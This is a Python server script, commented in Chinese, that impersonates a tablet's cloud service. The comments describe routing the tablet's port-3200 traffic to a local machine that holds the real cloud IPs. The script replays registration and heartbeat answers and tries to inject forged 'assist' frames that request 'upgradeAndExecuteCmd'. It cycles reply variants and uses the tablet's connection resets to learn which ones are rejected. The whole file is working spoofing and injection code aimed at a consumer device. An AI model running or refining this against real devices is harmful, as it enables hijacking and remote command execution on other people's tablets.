# -*- coding: utf-8 -*-
"""
cloud_3200.py — 3200 明文协议通道应答服务（中间段 v2，push_entry 修正落地）
背景: 5个真云公网IP已作为辅助IP挂到热点网卡, 平板发往真云IP:3200 的包被
本机内核本地投递. 本服务监听 0.0.0.0:3200(可自定义 host/port 供自测隔离),
由常规TCP栈完成三次握手, socket 收到明文帧后按注册/心跳协议应答.

应答规则(源自 consolidated.py 被动观测 + 反编译情报):
  注册帧 09030240...                          -> 09018233 ...R52N9067SSF...(含SN)
  心跳帧 0903010400 / 0903020400 / 0903010401 -> 09013206020131
  L7状态 09013206010131                       -> 09013206020131 (探测性应答)
  L12A   0903010401 09013206010131            -> 客户端已自含应答, 不回
  L12B   0901050b000000000000000a             -> 业务拉取帧, 未采到真云样本默认仅记录
                                                 可将 L12B_RESPOND 置 True 回候选帧

push_entry 注入修正(本轮关键):
  老版本在"注册应答 0.3s 后于同一 TCP 连接追加业务推送帧 09018234...JSON(171B)",
  实测被平板 RST.
  根因定性: 平板端 3200 是"一问一答"短状态机, 仅认证 注册/心跳/状态拉取 三类帧;
  assist 邀请属于 HTTP 协助面(学生端拉模式 GET /assists), 3200 通道不存在下行
  推送分支, 对未知业务帧(09018234)协议栈直接 RST + 断开连接.
  修正落地: 默认【彻底关闭】主动推送, 不再污染注册应答链路; 保留 build_entry_frame()
  构造函数与 env/sentinel 二次开关(CLOUD3200_PUSH=1 或 push_entry.sig 存在)供平板实测
  兜底实验. assist 主动注入的正路改走 cloud_api 的 HTTP 协助面 + orchestrator 2200
  SSDP 诱导(见 NEXT_STEPS_PLAN.md).
"""
import socket, threading, datetime, os, sys, json, time

HOST = "0.0.0.0"
PORT = int(os.environ.get("CLOUD3200_PORT") or 3200)
BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.environ.get("CLOUD3200_LOG") or os.path.join(BASE, "cloud3200.log")

# ---- 协议常量 ----
REG_PFX = bytes.fromhex("09030240")
HB_FRAMES = (bytes.fromhex("0903010400"),
             bytes.fromhex("0903020400"),
             bytes.fromhex("0903010401"))
L7 = bytes.fromhex("09013206010131")
L12A = bytes.fromhex("090301040109013206010131")
L12B = bytes.fromhex("0901050b000000000000000a")
PUSH_PFX = bytes.fromhex("09018234")

REG_RESP = bytes.fromhex(
    "090182330c405235324e39303637535346204b53754177677a55733659774e6a6454553059794d4449324d446b784f5141410064")
HB_RESP = bytes.fromhex("09013206020131")
L12B_CANDIDATE = bytes.fromhex("0901050b000000000000000a")

# 是否对 L12B 业务拉取帧回"协助邀请"业务帧(动态可改; 环境变量 L12B_RESPOND=0 可关)
L12B_RESPOND = os.environ.get("L12B_RESPOND", "1").lower() in ("1", "true", "yes")

# L12B 应答冷却: 防止平板连续拉取被反复投喂邀请帧
_L12B_LOCK = threading.Lock()
_L12B_LAST = [0.0]
L12B_COOLDOWN = float(os.environ.get("L12B_COOLDOWN") or 30)


# ---- L12B 应答变体轮换实验(平板侧每 10s 一轮, 用"是否被 RST"当反馈信号自动筛) ----
L12B_EXPERIMENT = os.environ.get("L12B_EXPERIMENT", "1").lower() in ("1", "true", "yes")
L12B_REPEAT = int(os.environ.get("L12B_REPEAT") or 2)
_EXP_LOCK = threading.Lock()
_EXP_IDX = [0]
_EXP_CNT = [0]
_LAST_SENT = {"variant": None, "t": 0.0}


def _entry_payload():
    obj = {"operate": "ENTRY", "assistId": "assist_marvis_0001", "assistType": "teacher",
           "requestType": "upgradeAndExecuteCmd", "teacherName": "MARVIS",
           "msg": "MARVIS_ASSIST_INJECT"}
    return json.dumps(obj, separators=(",", ":")).encode()


def _v_silent():
    return None


def _v_echo():
    return L12B


def _v_hb():
    return HB_RESP


def _v_reg():
    return REG_RESP


def _v_empty():
    return bytes.fromhex("090182340c400064")


def _v_entry():
    return build_entry_frame()


def _v_entry_notail():
    return build_entry_frame()[:-2]


def _v_entry_8233():
    return bytes.fromhex("090182330c41") + _entry_payload() + bytes.fromhex("0064")


L12B_VARIANTS = [
    ("silent", _v_silent),
    ("echo_l12b", _v_echo),
    ("hb", _v_hb),
    ("reg_replay", _v_reg),
    ("empty_8234", _v_empty),
    ("entry_json", _v_entry),
    ("entry_no_tail", _v_entry_notail),
    ("entry_type_8233", _v_entry_8233),
]


def l12b_variant_next():
    with _EXP_LOCK:
        idx = _EXP_IDX[0] % len(L12B_VARIANTS)
        name, fn = L12B_VARIANTS[idx]
        _EXP_CNT[0] += 1
        if _EXP_CNT[0] % L12B_REPEAT == 0:
            _EXP_IDX[0] = (idx + 1) % len(L12B_VARIANTS)
        return name, fn()


def l12b_resp():
    """L12B(业务拉取)的一问一答响应。
    实验模式(默认开): 按 L12B_VARIANTS 轮换候选应答, 以平板是否 RST 作二元反馈筛选。"""
    if not L12B_RESPOND:
        return None
    if L12B_EXPERIMENT:
        name, resp = l12b_variant_next()
        _LAST_SENT["variant"] = name
        _LAST_SENT["t"] = time.time()
        wlog(f"[L12B-EXP] try#{_EXP_CNT[0]} variant={name} "
             f"resp={'None' if resp is None else str(len(resp)) + 'B'}")
        return resp
    now = time.time()
    with _L12B_LOCK:
        if now - _L12B_LAST[0] < L12B_COOLDOWN:
            return None
        _L12B_LAST[0] = now
    return build_entry_frame()

# ---- push_entry 兜底实验开关(默认关闭) ----
PUSH_BIN = os.environ.get("PUSH_BIN") or os.path.join(BASE, "push_entry.bin")
PUSH_SIG = os.environ.get("PUSH_SIG") or os.path.join(BASE, "push_entry.sig")


def build_entry_frame(assist_id="assist_marvis_0001"):
    """构造 assist 协助邀请业务推送帧(09018234 + 0c41 + JSON + 0064)。
    已确认 3200 通道下行此类帧会被平板 RST/忽略, 仅保留用于构造验证与兜底实验。"""
    obj = {"operate": "ENTRY", "assistId": assist_id, "assistType": "teacher",
           "requestType": "upgradeAndExecuteCmd", "teacherName": "MARVIS",
           "msg": "MARVIS_ASSIST_INJECT"}
    js = json.dumps(obj, separators=(",", ":")).encode()
    return bytes.fromhex("090182340c41") + js + bytes.fromhex("0064")


def push_enabled():
    """push_entry 兜底实验开关: CLOUD3200_PUSH=1 或 push_entry.sig 哨兵存在即开启。
    默认关闭(修正后的安全默认)。"""
    ev = os.environ.get("CLOUD3200_PUSH", "").lower()
    if ev in ("1", "true", "yes"):
        return True
    return os.path.exists(PUSH_SIG)


def push_frame():
    """读取外部推送载荷(push_entry.bin)或默认构造; 为空返回 None。"""
    try:
        with open(PUSH_BIN, "rb") as f:
            payload = f.read()
        if payload and len(payload) > 0:
            return payload
    except OSError:
        pass
    return build_entry_frame()


def wlog(s):
    line = f"{datetime.datetime.now().strftime('%H:%M:%S')} {s}"
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass
    print(line, flush=True)


# REG 应答搭车投递 assist 邀请帧: 平板不发 L12B 时, 在必然发生的 reg 应答尾部拼接邀请帧
REG_PUSH = os.environ.get("REG_PUSH", "0").lower() in ("1", "true", "yes")
_REG_LOCK = threading.Lock()
_REG_LAST = [0.0]
REG_PUSH_COOLDOWN = float(os.environ.get("REG_PUSH_COOLDOWN") or 20)


def reg_resp():
    if not REG_PUSH:
        return REG_RESP
    now = time.time()
    with _REG_LOCK:
        if now - _REG_LAST[0] < REG_PUSH_COOLDOWN:
            return REG_RESP
        _REG_LAST[0] = now
    return REG_RESP + build_entry_frame()


def classify_frame(buf):
    """纯函数: 识别帧类型, 返回 (kind, resp_bytes|None)。
    kind ∈ reg|hb|l7|l12a|l12b|push_entry|unknown"""
    if buf.startswith(REG_PFX):
        return ("reg", reg_resp())
    if buf[:5] in HB_FRAMES:
        return ("hb", HB_RESP)
    if buf.startswith(L7):
        return ("l7", HB_RESP)
    if buf.startswith(L12A):
        return ("l12a", None)
    if buf.startswith(L12B):
        return ("l12b", l12b_resp())
    if buf.startswith(PUSH_PFX):
        return ("push_entry", None)
    return ("unknown", None)


def handle(conn, addr):
    try:
        conn.settimeout(20)
        buf = b""
        sent_reg = False
        while True:
            data = conn.recv(4096)
            if not data:
                break
            buf += data
            kind, resp = classify_frame(buf)
            wlog(f"[3200 RX {addr[0]}] len={len(data)} kind={kind} hex={buf.hex()[:120]}")
            if kind in ("l7", "l12a", "l12b", "push_entry"):
                wlog(f"[BIZFRAME-{kind}] {'应答' if resp else '仅记录, 不应答'}")
            if resp is not None:
                conn.sendall(resp)
                wlog(f"[3200 TX] kind={kind} {resp.hex()}")
                if kind == "reg":
                    sent_reg = True
            buf = b""
            # push_entry 兜底实验: 仅当显式开启 且 本次连接已完成注册应答 才注入
            if sent_reg and push_enabled() and kind == "reg":
                time.sleep(0.3)
                try:
                    pf = push_frame()
                    if pf:
                        conn.sendall(pf)
                        wlog(f"[PUSH-INJECT] 兜底实验: 注册应答后注入 {len(pf)}B hex={pf.hex()[:120]}")
                except OSError as e:
                    wlog(f"[PUSH-INJECT-ERR] {type(e).__name__}: {e}")
    except socket.timeout:
        pass
    except Exception as e:
        wlog(f"[ERR] {type(e).__name__}: {e}")
        v = _LAST_SENT.get("variant")
        if v and time.time() - _LAST_SENT.get("t", 0.0) < 8:
            wlog(f"[L12B-EXP-RESET] 变体 '{v}' 应答后平板复位连接(候选被拒信号)")
    finally:
        try:
            conn.close()
        except OSError:
            pass


def serve(host=HOST, port=PORT):
    """bind+listen, 返回 server socket; 端口被占用时记录并返回 None(优雅不崩)。"""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((host, port))
    except OSError as e:
        wlog(f"[FATAL] bind {host}:{port} 失败: {e} (可能已被占用)")
        return None
    srv.listen(8)
    wlog(f"cloud_3200 listen {host}:{port}  (native socket takeover)")
    return srv


def run_server(srv):
    """accept 循环(供 main 与自测复用)。"""
    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            break
        except Exception as e:
            wlog(f"[ACC ERR] {e}")
            continue
        threading.Thread(target=handle, args=(conn, addr), daemon=True).start()


def main():
    srv = serve()
    if srv is None:
        sys.exit(1)
    try:
        run_server(srv)
    finally:
        try:
            srv.close()
        except OSError:
            pass


if __name__ == "__main__":
    main()
